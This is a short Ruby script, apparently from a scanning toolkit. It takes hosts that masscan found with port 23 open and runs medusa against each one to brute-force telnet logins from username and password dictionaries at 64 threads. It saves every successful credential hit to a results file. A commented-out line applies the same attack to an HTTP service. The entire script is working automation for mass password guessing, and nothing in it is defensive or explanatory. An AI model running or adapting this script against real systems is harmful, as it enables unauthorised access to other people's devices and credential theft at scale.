#!/usr/bin/env ruby

#medusa -M http -h 10.99.184.116 -n 8888 -U ../../develop/masport/db/dict/user.txt -P ../../develop/masport/db/dict/pass.txt
input = '../db/masscan/ips.1433776043'

File.open(input).each do |line|
  line.chomp!
  next if !line.end_with?('23')
  service = 'telnet'
  result = ''
  ary = line.split ':'
  ip   = ary[0]
  port = ary[1]
  if ip and port
    #puts line
    cmd="medusa -e ns -t 64 -w 1 -v 4 -M #{service} -h #{ip} -n #{port} -U ../db/dict/user.txt -P ../db/dict/pass.txt"
    puts 'Running syscmd: '+cmd
    result = `#{cmd}`
    if result and result.include? '[SUCCESS]'
      File.open('../db/medusa/telnet_result.txt', 'a') { |file| 
        file.write(cmd)
        file.write(result) 
      }
    end
    puts result
  end

end

